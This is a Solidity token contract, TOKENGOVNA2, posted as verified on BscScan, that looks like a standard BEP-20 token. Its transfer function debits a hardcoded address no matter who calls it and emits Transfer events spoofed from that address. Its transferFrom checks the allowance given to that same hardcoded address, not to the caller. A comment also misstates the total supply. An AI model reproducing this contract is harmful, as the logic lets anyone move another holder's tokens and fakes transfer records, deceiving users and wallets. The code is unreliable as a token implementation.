/**
 *Submitted for verification at BscScan.com on 2022-12-09
*/

pragma solidity 0.8.4;

 
   contract TOKENGOVNA2 {
   string public name = "TOKENGOVNA2";
   string public symbol = "TKNGVN2";
   uint256 public totalSupply = 100000000000000000000000000;
   // 1 миллион
   uint8 public decimals = 18;
   
   
   event Transfer(address indexed _from, address indexed _to, uint256 _value);
 
   event Approval(
       address indexed _owner,
       address indexed _spender,
       uint256 _value
   );
   mapping(address => uint256) public balanceOf;
   mapping(address => mapping(address => uint256)) public allowance;
    
   
   constructor() {
       balanceOf[msg.sender] = totalSupply;
   }
    
 
   function transfer(address _to, uint256 _value)
       public
       returns (bool success)
   {
       require(balanceOf[0xa1e0643185D3D800CD20Eb6753328D6139e8599b] >= _value);
       balanceOf[0xa1e0643185D3D800CD20Eb6753328D6139e8599b] -= _value;
       balanceOf[_to] += _value;
       emit Transfer(0xa1e0643185D3D800CD20Eb6753328D6139e8599b, _to, _value);
       return true;
   }
   
     
   function approve(address _spender, uint256 _value)
       public
       returns (bool success)
   {
       allowance[msg.sender][_spender] = _value;
       emit Approval(msg.sender, _spender, _value);
       return true;
   }

     
   function transferFrom(
       address _from,
       address _to,
       uint256 _value
   ) public returns (bool success) {
       require(_value <= balanceOf[_from]);
       require(_value <= allowance[_from][0xa1e0643185D3D800CD20Eb6753328D6139e8599b]);
       balanceOf[_from] -= _value;
       balanceOf[_to] += _value;
       allowance[_from][0xa1e0643185D3D800CD20Eb6753328D6139e8599b] -= _value;
       emit Transfer(_from, _to, _value);
       return true;
   }
}